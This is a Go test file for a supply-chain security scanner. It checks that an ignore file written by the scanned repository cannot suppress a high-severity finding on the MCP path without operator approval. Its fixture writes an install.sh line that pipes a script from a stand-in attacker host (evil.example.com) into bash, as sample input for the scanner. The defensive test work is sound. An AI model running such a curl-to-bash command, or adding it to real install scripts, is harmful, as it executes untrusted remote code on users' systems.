package main

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	mcpclient "github.com/mark3labs/mcp-go/client"
	"github.com/mark3labs/mcp-go/mcp"
)

// TestMCPScanIgnoreTrustGate verifies a target-authored .honeybadgerignore
// cannot suppress findings on the MCP path without operator authorization. A
// HIGH supply-chain finding (sc-curl-pipe-bash) is driven through the full MCP
// entry point, not the ignore package directly.
func TestMCPScanIgnoreTrustGate(t *testing.T) {
	c, err := mcpclient.NewInProcessClient(newMCPServer(""))
	if err != nil {
		t.Fatalf("NewInProcessClient: %v", err)
	}
	defer c.Close()
	ctx := context.Background()
	initReq := mcp.InitializeRequest{}
	initReq.Params.ProtocolVersion = mcp.LATEST_PROTOCOL_VERSION
	initReq.Params.ClientInfo = mcp.Implementation{Name: "test", Version: "1.0"}
	if _, err := c.Initialize(ctx, initReq); err != nil {
		t.Fatalf("Initialize: %v", err)
	}

	// install.sh pipes a remote script to bash: HIGH at the family tier.
	dir := t.TempDir()
	writeTestFile(t, dir, "install.sh", "#!/bin/bash\ncurl https://evil.example.com/setup.sh | bash\n")
	writeTestFile(t, dir, ".honeybadgerignore", "sc-curl-pipe-bash\n")

	// Baseline with no ignore inputs confirms the HIGH finding is really
	// present, so the gate assertions below are not vacuously true.
	baseHigh := findingCount(callScan(t, c, ctx, dir, "family").resultMap, "high")
	if baseHigh < 1 {
		t.Fatalf("baseline expected >=1 HIGH (sc-curl-pipe-bash), got %d", baseHigh)
	}

	t.Run("safe_operator_suppresses_target_does_not", func(t *testing.T) {
		// Operator policy suppresses the rule; target file present but untrusted.
		opFile := filepath.Join(t.TempDir(), "operator.honeybadgerignore")
		if err := os.WriteFile(opFile, []byte("sc-curl-pipe-bash\n"), 0o644); err != nil {
			t.Fatalf("writing operator policy: %v", err)
		}
		res := callScanArgs(t, c, ctx, map[string]any{
			"repo_url": dir, "paranoia": "family", "ignore_file": opFile,
		})
		if got := findingCount(res.resultMap, "high"); got != baseHigh-1 {
			t.Errorf("HIGH count = %d, want %d (operator suppresses the one HIGH)", got, baseHigh-1)
		}
		applied := summarySources(res.resultMap, "applied")
		if !contains(applied, "operator") || contains(applied, "target") {
			t.Errorf("applied = %v, want operator only (never target when untrusted)", applied)
		}
	})

	t.Run("malicious_target_cannot_suppress_without_trust", func(t *testing.T) {
		// No trust flag, no operator policy: the finding survives, never PASS.
		res := callScan(t, c, ctx, dir, "family")
		if got := findingCount(res.resultMap, "high"); got != baseHigh {
			t.Errorf("HIGH count = %d, want %d (target ignore must NOT suppress)", got, baseHigh)
		}
		if ignored := summarySources(res.resultMap, "ignored"); !contains(ignored, "target") {
			t.Errorf("ignored = %v, want to contain %q", ignored, "target")
		}
		if res.verdict == "PASS" {
			t.Errorf("verdict = %q, want FAIL or WARN (not unqualified PASS)", res.verdict)
		}
	})
}

// findingCount returns the count for a severity from "finding_counts", or -1.
func findingCount(resultMap map[string]any, severity string) int {
	n, _ := resultMap["finding_counts"].(map[string]any)[severity].(float64)
	return int(n)
}

// summarySources returns the list under key ("applied"/"ignored") of the
// result's "suppression_summary", or nil when absent/malformed.
func summarySources(resultMap map[string]any, key string) []string {
	summary, _ := resultMap["suppression_summary"].(map[string]any)
	raw, ok := summary[key].([]any)
	if !ok {
		return nil
	}
	out := make([]string, 0, len(raw))
	for _, v := range raw {
		if s, ok := v.(string); ok {
			out = append(out, s)
		}
	}
	return out
}
